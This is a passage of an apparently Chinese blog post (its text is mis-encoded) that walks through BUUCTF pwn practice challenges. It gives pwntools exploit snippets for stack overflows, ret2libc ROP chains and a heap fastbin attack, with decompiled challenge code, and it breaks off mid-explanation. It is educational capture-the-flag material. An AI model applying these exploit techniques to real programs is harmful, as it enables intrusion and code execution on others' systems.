<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>BUUCTF Pwn ç»ƒä¹  - Lab on Mercury</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Lab on Mercury"><meta name="msapplication-TileImage" content="/img/favicon.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Lab on Mercury"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta description="ä»ä»Šå¤©èµ·ï¼Œæˆ‘ä¹Ÿæ˜¯PwnğŸ•äº†ã€‚"><meta property="og:type" content="blog"><meta property="og:title" content="BUUCTF Pwn ç»ƒä¹ "><meta property="og:url" content="https://signormercurio.me/post/BUUPwn/"><meta property="og:site_name" content="Lab on Mercury"><meta property="og:description" content="ä»ä»Šå¤©èµ·ï¼Œæˆ‘ä¹Ÿæ˜¯PwnğŸ•äº†ã€‚"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://signormercurio.me/img/og_image.png"><meta property="article:published_time" content="2019-12-14T13:46:20.000Z"><meta property="article:author" content="Mercury"><meta property="article:tag" content="æ ˆè¿ç§»"><meta property="article:tag" content="æ•´æ•°æº¢å‡º"><meta property="article:tag" content="ROP"><meta property="article:tag" content="fastbin-attack"><meta property="article:tag" content="mprotect"><meta property="article:tag" content="SROP"><meta property="article:tag" content="tcache"><meta property="article:tag" content="off-by-one"><meta property="article:tag" content="unlink"><meta property="article:tag" content="fastbin-consolidation"><meta property="article:tag" content="mmap_thresold"><meta property="article:tag" content="House-of-Force"><meta property="article:tag" content="House-of-Spirit"><meta property="article:tag" content="largebin-attack"><meta property="article:tag" content="House-of-Orange"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://signormercurio.me/post/BUUPwn/"},"headline":"Lab on Mercury","image":["https://signormercurio.me/img/og_image.png"],"datePublished":"2019-12-14T13:46:20.000Z","author":{"@type":"Person","name":"Mercury"},"description":"ä»ä»Šå¤©èµ·ï¼Œæˆ‘ä¹Ÿæ˜¯PwnğŸ•äº†ã€‚"}</script><link rel="canonical" href="https://signormercurio.me/post/BUUPwn/"><link rel="alternate" href="/atom.xml" title="Lab on Mercury" type="application/atom+xml"><link rel="icon" href="/img/favicon.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/favicon.png" alt="Lab on Mercury" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2019-12-14T13:46:20.000Z" title="2019-12-14T13:46:20.000Z">2019-12-14</time></span><span class="level-item"><a class="link-muted" href="/categories/%E5%AE%89%E5%85%A8/">å®‰å…¨</a><span>Â /Â </span><a class="link-muted" href="/categories/%E5%AE%89%E5%85%A8/Pwn/">Pwn</a></span><span class="level-item">an hour read (About 10274 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">BUUCTF Pwn ç»ƒä¹ </h1><div class="content"><p>ä»ä»Šå¤©èµ·ï¼Œæˆ‘ä¹Ÿæ˜¯PwnğŸ•äº†ã€‚</p>
<a id="more"></a>

<h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>nc ç›´æ¥è¿ï¼Œ<code>cat flag</code>ã€‚</p>
<h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>æ ˆæº¢å‡ºï¼Œå¯ç›´æ¥è¦†ç›–è¿”å›åœ°å€ï¼Œæ³¨æ„ 64 ä½ï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xf</span>+<span class="number">8</span>) + p64(elf.symbols[<span class="string">&#x27;fun&#x27;</span>])</span><br><span class="line">s(payload)</span><br></pre></td></tr></table></figure>

<h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>å’Œä¸Šé¢˜å…¶å®ä¸€æ ·ï¼Œç¨‹åºä¸­å­˜åœ¨åé—¨ï¼Œç›´æ¥è¿”å›è¿‡å»ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">8</span>) + p64(<span class="number">0x40060d</span>)</span><br><span class="line">s(payload)</span><br></pre></td></tr></table></figure>

<h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><p>ç›´æ¥è¿è¡Œå‡ æ¬¡æˆ–è€…æºç å®¡è®¡å¯ä»¥å‘ç°æ˜¯å°†è¾“å…¥çš„<code>I</code>æ›¿æ¢ä¸º<code>you</code>ï¼Œå…¶ä½™çš„å…¶å®å’Œä¸Šé¢ä¸€æ ·ï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;I&#x27;</span>*(<span class="number">0x3c</span> // <span class="number">3</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(elf.symbols[<span class="string">&#x27;get_flag&#x27;</span>])</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><p>å¼€å¯äº† NX ä¿æŠ¤ï¼Œå¹¶ä¸”æœ‰æœªé™åˆ¶é•¿åº¦çš„<code>gets</code>ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šæ˜¯ ROP æ ˆæº¢å‡ºã€‚IDA æœä¸€ä¸‹ stringï¼Œå¯ä»¥å‘ç°æœ‰ libc å¯ä»¥ç”¨ï¼Œè€ƒè™‘ ret2libcã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">payload</span>):</span></span><br><span class="line">	ru(<span class="string">&#x27;!\n&#x27;</span>)</span><br><span class="line">	sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	ru(<span class="string">&#x27;ed\n&#x27;</span>)</span><br><span class="line">	sl(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span>,pop_rdi,elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>],elf.plt[<span class="string">&#x27;puts&#x27;</span>],elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">send(payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;@\n&#x27;</span>)</span><br><span class="line">leak = uu64(r(<span class="number">6</span>))</span><br><span class="line">system,binsh = ret2libc(leak, <span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span>,pop_rdi,binsh,system)</span><br><span class="line">send(payload)</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>ä¾ç„¶æ˜¯æœ€ç®€å•çš„æ— ä¿æŠ¤<code>gets</code>å¹¶ä¸”ç¨‹åºä¸­æœ‰<code>system(&quot;cat /flag&quot;)</code>ï¼Œæ‰¾åˆ°åè€…åœ°å€è¿”å›è¿‡å»å³å¯ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat_flag = <span class="number">0x4006be</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">payload</span>):</span></span><br><span class="line">	ru(<span class="string">&#x27;number.\n&#x27;</span>)</span><br><span class="line">	sl(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>, cat_flag)</span><br><span class="line">send(payload)</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><p>å’Œä¸Šä¸Šé¢˜ä¸€æ ·ã€‚</p>
<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = sub_804871F(buf);</span><br><span class="line">  sub_80487D0(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>main</code>ä¸­<code>sub_80486BB</code>ç”¨äºåˆå§‹åŒ–ï¼Œç„¶åå°†ä¸€ä¸ªéšæœºæ•°ä¼ å…¥<code>sub_804871F</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_804871F</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Ch] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">7</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v5; <span class="comment">// [esp+33h] [ebp-25h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">&quot;%ld&quot;</span>, a1);</span><br><span class="line">  v6 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">  buf[v6 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, &amp;s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„<code>a1</code>å°±æ˜¯ä¼ å…¥çš„éšæœºæ•°ï¼Œç„¶åè¦æ±‚æˆ‘ä»¬çš„è¾“å…¥å’Œéšæœºæ•°ç»è¿‡<code>strncmp</code>æ¯”è¾ƒåå®Œå…¨ç›¸åŒï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥<code>\x00</code>ä½¿å¾—<code>strlen</code>å‡½æ•°è¿”å› 0ï¼Œä»è€Œä½¿å¾—<code>strncmp</code>å‡½æ•°åªæ¯”è¾ƒ 0 ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆå°±èƒ½ç»•è¿‡è¿™é‡Œçš„<code>exit(0)</code>ï¼Œå¹¶è¿”å›<code>v5</code>ã€‚æ³¨æ„åˆ°è¿™é‡Œçš„è¿”å›å€¼<code>v5</code>åœ¨<code>ebp-0x25</code>ï¼Œè·ç¦»æˆ‘ä»¬èƒ½æ§åˆ¶çš„ä½äº<code>ebp-0x2c</code>çš„å˜é‡<code>buf</code>ç›¸å·®<code>0x7</code>ï¼Œå°äºè¿™é‡Œ<code>read</code>çš„é•¿åº¦é™åˆ¶<code>0x20</code>ï¼Œå› æ­¤å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºæ§åˆ¶<code>v5</code>çš„å€¼ï¼Œä»è€Œæ§åˆ¶<code>main</code>ä¸­çš„<code>v2</code>ã€‚</p>
<p>éšåï¼Œ<code>v2</code>ä¼šè¢«ä¼ å…¥<code>sub_80487D0</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __cdecl <span class="title">sub_80487D0</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+11h] [ebp-E7h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">    result = read(<span class="number">0</span>, &amp;buf, <span class="number">0xC8</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = read(<span class="number">0</span>, &amp;buf, a1);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>a1</code>å°±æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„<code>v2</code>ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œå¯ä»¥å‘<code>buf</code>å†™å…¥çš„æ•°æ®é•¿åº¦ä¹Ÿæ˜¯æˆ‘ä»¬èƒ½æ§åˆ¶çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¸Œæœ›å®ƒå°½å¯èƒ½å¤§ï¼Œä¹Ÿå°±æ˜¯ç­‰äº<code>0xff</code>ã€‚é‚£ä¹ˆåœ¨ä¸Šä¸€ä¸ªå‡½æ•°ä¸­æˆ‘ä»¬å°±éœ€è¦ä»¤<code>v5</code>ä¸º<code>0xff</code>ï¼Œç»“åˆä¸Šé¢çš„ç»•è¿‡ï¼Œå¯ä»¥è¾“å…¥<code>&#39;\x00&#39; + 6*&#39;a&#39; + &#39;\xff&#39;</code>æ¥è¾¾åˆ°è¿™ä¸ªç›®çš„ã€‚æœ€å<code>ret2libc</code>å³å¯ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send1</span>():</span></span><br><span class="line">	payload = flat(<span class="string">&#x27;\x00&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">6</span>,<span class="string">&#x27;\xff&#x27;</span>)</span><br><span class="line">	sl(payload)</span><br><span class="line">	ru(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">send1()</span><br><span class="line">main = <span class="number">0x8048825</span></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">4</span>),elf.plt[<span class="string">&#x27;write&#x27;</span>],main,<span class="number">1</span>,elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>],<span class="number">4</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">leak = u32(r(<span class="number">4</span>))</span><br><span class="line">system,binsh = ret2libc(leak, <span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">send1()</span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">4</span>),system,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,binsh)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<h2 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Baby Heap in 2017 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">1. Allocate</span><br><span class="line">2. Fill</span><br><span class="line">3. Free</span><br><span class="line">4. Dump</span><br><span class="line">5. Exit</span><br></pre></td></tr></table></figure>

<p>åˆ†é…å†…å­˜ä½¿ç”¨äº†<code>calloc</code>ï¼Œæ¯æ¬¡åˆ†é…ä¼šå…ˆæ¸…ç©ºä¸€ä¸‹è¿™å—å†…å­˜ï¼Œå¤§å°é™åˆ¶æ˜¯ 4096Bã€‚å¡«å……æ—¶ç›´æ¥è¯»å–ç”¨æˆ·è¾“å…¥ï¼Œæ²¡æœ‰æ£€æŸ¥é•¿åº¦ï¼Œå› æ­¤å¯ä»¥å †æº¢å‡ºã€‚é™¤äº† canary å¤–ä¿æŠ¤å…¨å¼€ï¼Œå› æ­¤è€ƒè™‘æ³„éœ² libcã€‚å¦‚ä½•æ³„éœ²ï¼Ÿ</p>
<p>å½“åªæœ‰ä¸€ä¸ª small bin/large bin è¢«é‡Šæ”¾æ—¶ï¼Œå…¶<code>fd</code>ä¸<code>bk</code>æŒ‡å‘<code>main_arena</code>ä¸­çš„åœ°å€ï¼Œè€Œåè€…æ˜¯ libc çš„ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå› æ­¤å¯ä»¥é€šè¿‡å®ƒæ³„éœ²å‡º libc åŸºå€ã€‚</p>
<p>é¦–å…ˆåˆ†é… 4 ä¸ª fast chunk å’Œ 1 ä¸ª small chunkï¼ˆä¸å¦¨åˆ†åˆ«ç§°ä¸º<code>a,b,c,d,e</code>ï¼‰ï¼Œç„¶åé‡Šæ”¾<code>b</code>ï¼Œå®ƒå°†è¢«åŠ å…¥ fast bin é¡¶éƒ¨ã€‚æ­¤æ—¶å†é‡Šæ”¾<code>c</code>ï¼Œé‚£ä¹ˆ<code>c</code>ä¹Ÿä¼šåŠ å…¥ fast bin é¡¶éƒ¨ï¼Œå¹¶ä¸”å®ƒçš„<code>fd</code>æŒ‡å‘<code>b</code>ã€‚æ­¤æ—¶æœ‰ï¼š<code>freelist-&gt;c-&gt;b</code>ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	alloc(<span class="number">0x10</span>) <span class="comment"># a0,b1,c2,d3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># e4</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># b</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment"># c</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±å¯ä»¥è¿›è¡Œ fastbin attackã€‚åˆ©ç”¨<code>Fill</code>å †æº¢å‡ºä¿®æ”¹<code>c</code>çš„<code>fd</code>ä¸º<code>e</code>çš„åœ°å€ï¼ˆæˆ‘ä»¬éœ€è¦ä»æœªè¢«é‡Šæ”¾çš„<code>a</code>å¼€å§‹å¡«å……ï¼Œæ‰€ä»¥åˆšæ‰ä¸æ˜¯ä»<code>a</code>å¼€å§‹é‡Šæ”¾ï¼‰ï¼Œéšåç¬¬ä¸€æ¬¡<code>Allocate</code>æ‹¿åˆ°<code>c</code>ï¼Œç¬¬äºŒæ¬¡<code>Allocate</code>å°±èƒ½æ‹¿åˆ°<code>e</code>ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># c-&gt;fd = e</span></span><br><span class="line">payload = flat([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x21</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x21</span>,<span class="string">&#x27;\x80&#x27;</span>])</span><br><span class="line">fill(<span class="number">0</span>, payload)</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„è¿™é‡Œ payload çš„å‰ä¸‰ä¸ª<code>0</code>ç”¨äºå¡«å……<code>a</code>ä¸­<code>0x10</code>å­—èŠ‚çš„ç”¨æˆ·æ•°æ®å’Œ<code>b</code>ä¸­<code>0x8</code>å­—èŠ‚çš„<code>prev_size</code>å­—æ®µï¼Œåé¢åŒç†ã€‚<code>0x21</code>æ˜¯<code>a/b/c/d</code>çš„<code>chunk_size</code>ï¼Œ<code>0x80</code>æ˜¯<code>e</code>çš„åœ°å€ä½ 8 ä½ï¼Œéƒ½å¯ä»¥é€šè¿‡ gdb è°ƒè¯•å¾—åˆ°ã€‚</p>
<blockquote>
<p>æ³¨ï¼š<code>0x21</code>ä½ä½çš„<code>1</code>è¡¨ç¤º<code>PREV_INUSE</code>ï¼Œè¿™å’Œ fast bin ä¸­ chunk çš„ P ä½ä¸å˜æ˜¯ä¸€è‡´çš„ã€‚</p>
</blockquote>
<p>ç„¶è€Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªå®‰å…¨æ£€æŸ¥ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ£€æŸ¥æˆ‘ä»¬æ‹¿åˆ°çš„ chunk çš„å¤§å°æ˜¯å¦åœ¨å¯¹åº”ç´¢å¼•çš„ fast bin èŒƒå›´å†…ã€‚æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ä¿®æ”¹<code>e</code>çš„<code>chunk_size</code>å­—æ®µï¼Œæ–¹æ³•åŒæ ·æ˜¯å †æº¢å‡ºã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># e-&gt;chunk_size = 0x21</span></span><br><span class="line">payload = flat([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x21</span>])</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œé€šè¿‡<code>d</code>æº¢å‡ºåˆ°<code>e</code>çš„<code>chunk_size</code>å¹¶è¦†ç›–ä¸Šäº†<code>0x21</code>ï¼Œgdb è°ƒè¯•å¾—åˆ°å…¶ç´¢å¼•ä¸º<code>2</code>ã€‚</p>
<p>ä¿®æ”¹å®Œæˆåæ‰å¯ä»¥è¿›è¡Œä¸¤æ¬¡<code>alloc(0x10)</code>ä»è€Œæ‹¿åˆ°<code>e</code>ã€‚æ‹¿åˆ°<code>e</code>åå†é‡Šæ”¾æ‰å®ƒå°±å¯ä»¥è·å¾—å…¶<code>fd</code>ä¸<code>bk</code>ï¼Œä½†è¿™é‡Œæœ‰ä¸¤ä¸ªé—®é¢˜ï¼š</p>
<ol>
<li>å‰é¢å¯¹å…¶<code>chunk_size</code>çš„ä¿®æ”¹ä¼šå¯¼è‡´é‡Šæ”¾æ—¶<code>e</code>è¿›å…¥ fast binï¼Œæ‹¿ä¸åˆ°<code>fd</code>å’Œ<code>bk</code>ã€‚</li>
<li><code>e</code>è¢«é‡Šæ”¾åä¸ top chunk ç›¸é‚»ï¼Œå¿…å®šä¼šè¢«åˆå¹¶ã€‚</li>
<li><code>fd</code>å’Œ<code>bk</code>åˆ°åº•æŒ‡å‘å“ªé‡Œï¼Ÿ</li>
</ol>
<p>è§£ç­”ï¼š</p>
<ol>
<li>æŠŠ<code>e</code>çš„<code>chunk_size</code>æ¢å¤å³å¯ã€‚</li>
<li>é‡Šæ”¾<code>e</code>å‰å†å¤šç”³è¯·ä¸€ä¸ª small chunk ä½¿å¾—<code>e</code>ä¸ä¸ top chunk ç›¸é‚»ã€‚</li>
